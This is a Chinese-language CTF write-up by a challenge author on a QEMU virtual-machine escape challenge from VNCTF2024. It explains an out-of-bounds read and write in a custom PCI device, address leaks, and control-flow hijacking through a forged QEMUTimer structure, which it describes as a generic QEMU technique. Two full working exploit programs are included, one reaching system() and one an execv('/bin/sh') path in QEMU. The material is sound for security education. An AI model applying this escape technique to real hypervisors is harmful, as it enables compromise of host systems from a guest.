# vnctf2024 escape_langlang_mountain2 wp

## 前言

用户态的题实在想不出新的点子，去年的VNCTF有qemu逃逸，所以今年继续沿用，正好自己也复现过一些qemu的CVE。

在以往的qemu逃逸题中似乎很少有用伪造QEMUTimer结构体去劫持控制流的方法，本人也只在hfctf2022的hfdev和qwb2019的ExecChrome遇到过，不过它们都是使用自身的设备中的QEMUTimer结构体，自己复现CVE-2019-6778时了解到：伪造一个QEMUTimerList结构体和QEMUTimer结构体，然后修改全局变量main_loop_tlg为伪造的QEMUTimerList结构体地址就能实现逃逸，不用依赖任何设备中的QEMUTimer，在qemu中这就是一种通用的攻击方法。基于此就整出了escape_langlang_mountain2这道题。

## 正文

vn_mmio_write函数中可以随意修改(v5 + 2944)，在vn_mmio_read函数中就是通过这个值去读取缓冲区的值，但是这个值可以是负数，也就给了越界读取数据的机会

<img src="img/Screenshot 2024-02-07 152011.png" style="zoom:80%;" />

MemoryRegion的结构体在缓冲区之上，通过设置好负数读取ops的地址就可以实现对qemu地址泄漏，读取opaque的地址也就知道vn设备在堆中的地址

```c
struct MemoryRegion {
    ...
    ...
    DeviceState *dev;

    const MemoryRegionOps *ops;
    void *opaque;
    MemoryRegion *container;
    ...
    ...
}
```

vn_mmio_write函数也可以通过(v5 + 2944)去写入4字节，但是只能写一次，最后的劫持控制流是通过伪造QEMUTimer结构体，然后去修改QEMUTimerList结构体中的active_timers，具体原因一下参考本人复现CVE-2020-14364的文章：https://xtxtn.github.io/2023/10/11/CVE-2020-14364/#%E4%BF%AE%E6%94%B9time-list   。

总体思路：

1. 读取MemoryRegion的结构体中的ops和opaque值
2. QEMUTimerList的地址可以通过qemu的全局变量main_loop_tlg去泄漏，堆和qemu的地址一般非常接近，正好可以在一个32位负数的范围内读取全局变量main_loop_tlg中的值
3. 在vn设备的缓冲区中伪造QEMUTimer结构体
4. QEMUTimerList结构体就存在于堆上，并且地址小于vn设备，设置好负数修改active_timers即可

完整exp：

```c
#define _GNU_SOURCE
#include <stdio.h>
#include <string.h>
#include <stdint.h>
#include <stdlib.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <sys/io.h>

void * mmio;

uint32_t mmio_read(uint32_t addr){
    return *(uint32_t *)(mmio + addr);
}

void mmio_write(uint32_t addr, uint64_t val){
    *(uint64_t *)(mmio + addr) = val;
}

uint64_t read_val(int offset){
    uint64_t val;
    mmio_write(0x10, offset + 4);
    val = mmio_read(0x20);
    mmio_write(0x10, offset);
    val = (val << 32) + mmio_read(0x20);
    return val;
}

void write_val(int offset, uint64_t val){
    mmio_write(0x20, ((uint64_t)offset << 32) + (val & 0xffffffff));
    mmio_write(0x20, ((uint64_t)(offset + 4) << 32) + (val >> 32));
}

int main(){
    int  mmio_fd = open("/sys/devices/pci0000:00/0000:00:04.0/resource0", O_RDWR | O_SYNC);
    mmio         = mmap(0, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED, mmio_fd, 0);

    uint64_t elf_addr = read_val(-192);
    printf("[*] leak the elf_addr is : %#lx\n", elf_addr);
    uint64_t heap_addr = read_val(-192 + 8);
    printf("[*] leak the heap_addr is : %#lx\n", heap_addr);

    uint64_t elf_base = elf_addr - 0xf581e0;
    uint64_t system_plt = elf_base + 0x312040;
    uint64_t main_loop_tlg = elf_base + 0x14b9480;
    uint64_t vn_buf_addr = heap_addr + 0xb40;

    uint64_t timer_list_addr = read_val(main_loop_tlg + 8 - vn_buf_addr);
    printf("[*] leak the timer_list_addr is : %#lx\n", timer_list_addr);

    uint64_t fake_timer_addr = vn_buf_addr;
    uint64_t cmd_addr = fake_timer_addr + 0x30;
    write_val(8, timer_list_addr);
    write_val(0x10, system_plt);
    write_val(0x18, cmd_addr);
    write_val(0x30, 0x67616c6620746163); //cat flag

    mmio_write(0x10, timer_list_addr + 0x40 - vn_buf_addr);
    mmio_write(0x30, fake_timer_addr);
}
```

## 非预期

这次比赛唯一解出此题的Tplus师傅发现net_bridge_run_helper函数存在一个execv("/bin/sh")，修改MemoryRegion的结构体中的ops劫持控制流

<img src="img/Screenshot 2024-02-17 230750.png" style="zoom:100%;" />

出题人自己属实没想到qemu中有这种后门类似的东西，Tplus师傅实在tql。

这里贴出Tplus师傅的解法：

```c
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <errno.h>
#include <signal.h>
#include <fcntl.h>
#include <ctype.h>
#include <termios.h>
#include <assert.h>

#include <sys/types.h>
#include <sys/mman.h>
#include <sys/io.h>

// #define MAP_SIZE 4096UL
#define MAP_SIZE 0x1000000
#define MAP_MASK (MAP_SIZE - 1)


char* pci_device_name = "/sys/devices/pci0000:00/0000:00:04.0/resource0";

unsigned char* mmio_base;

unsigned char* getMMIOBase(){

    int fd;
    if((fd = open(pci_device_name, O_RDWR | O_SYNC)) == -1) {
        perror("open pci device");
        exit(-1);
    }
    mmio_base = mmap(0, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED, fd,0);
    if(mmio_base == (void *) -1) {
        perror("mmap");
        exit(-1);
    }
    return mmio_base;
}

void mmio_write(uint64_t addr, uint64_t value)
{
    *((uint64_t*)(mmio_base + addr)) = value;
}

uint32_t mmio_read(uint64_t addr)
{
    return *((uint32_t*)(mmio_base + addr));
}
void mmio_write_idx(uint64_t idx, uint64_t value)
{
    uint64_t val = value + (idx << 32);
    mmio_write(0x20,val);
}

int main(int argc, char const *argv[])
{
    uint32_t catflag_addr = 0x6E65F9;

    getMMIOBase();
    printf("mmio_base Resource0Base: %p\n", mmio_base);
    mmio_write(0x10, -17*0x8);
    uint64_t pie_low = mmio_read(0x20);
    mmio_write(0x10, -17*0x8 + 0x4);
    uint64_t pie_high = mmio_read(0x20);
    uint64_t pie = pie_low + (pie_high << 32) - 0x82B35B;
    printf("pie = 0x%llx\n", pie);
    mmio_write(0x10, -10*0x8);
    uint64_t heap_low = mmio_read(0x20);
    mmio_write(0x10, -10*0x8 + 0x4);
    uint64_t heap_high = mmio_read(0x20);
    uint64_t heap = heap_low + (heap_high << 32);
    printf("heap = 0x%llx\n", heap);
    uint64_t system_plt = pie;
    uint64_t backdoor = pie + 0x67429B;
    uint64_t system_plt_addr = heap + 0x60 + 8;
    uint64_t cmdaddr = heap + 0x58 + 8;
    mmio_write_idx(8,0x20746163);
    mmio_write_idx(12,0x67616C66);
    mmio_write_idx(16,backdoor & 0xffffffff);
    mmio_write_idx(20,backdoor >> 32);
    mmio_write_idx(24,system_plt_addr & 0xffffffff);
    mmio_write_idx(28,system_plt_addr >> 32);
    mmio_write_idx(32,cmdaddr & 0xffffffff);
    mmio_write_idx(36,cmdaddr >> 32);
    for(int i = 40;i <= 60 ;i += 4 )
    {
        mmio_write_idx(i,0);
    }
    mmio_write(0x10,-0xc0);
    getchar();
    mmio_write(0x30,system_plt_addr);
    mmio_read(0);
    return 0;
}
```

## 结语

本来觉得这个出题点算是一次很大的创新，没想到赛后直接喜提pwn方向的差评第一😭，差评率更是遥遥领先，可能漏洞设置得确实有点刁钻，希望不了解QEMUTimer攻击方式的师傅可以多了解一下。

如果有什么其它问题或者更好的解法，欢迎联系出题人（QQ：1744624466）。
